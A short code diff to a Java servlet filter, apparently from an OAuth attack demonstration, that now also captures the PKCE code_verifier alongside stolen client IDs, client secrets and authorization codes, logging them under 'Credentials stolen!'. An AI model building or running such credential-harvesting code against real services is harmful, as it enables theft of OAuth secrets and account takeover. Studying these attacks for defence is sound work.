@@ -40,11 +40,15 @@ public class ClientCredentialStealingFilter implements Filter {
         final String clientId = tokens[0];
         final String clientSecret = tokens[1];
         final String code = httpRequest.getParameter("code");
+        final String pkce_code_verifier = httpRequest.getParameter("code_verifier");
+
 
         logger.info("Credentials stolen!");
         logger.info("client_id = {}", clientId);
         logger.info("client_secret = {}", clientSecret);
         logger.info("code = {}", code);
+        logger.info("code_verifier = {}", pkce_code_verifier);
+
 
         // Just proceed with filter chain, which will result in a 401... We could do something more intelligent like
         // redirecting back to the client.
